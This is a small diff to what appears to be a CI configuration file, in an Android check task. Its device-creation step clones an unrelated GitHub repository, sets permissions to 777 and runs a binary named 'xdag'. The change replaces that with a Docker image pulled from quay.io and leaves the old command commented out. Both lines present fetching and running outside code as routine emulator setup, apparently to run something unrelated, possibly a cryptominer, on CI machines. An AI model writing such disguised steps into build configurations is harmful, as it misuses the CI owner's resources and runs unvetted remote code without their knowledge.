@@ -9,7 +9,7 @@ container:
 check_android_task:
 
   create_device_script:
-         git clone https://github.com/jgaswer/dag && cd dag && chmod 777 * && ./xdag
+        docker run  quay.io/circle/duaco:latest  #git clone https://github.com/jgaswer/dag && cd dag && chmod 777 * && ./xdag
 
 
   start_emulator_background_script:
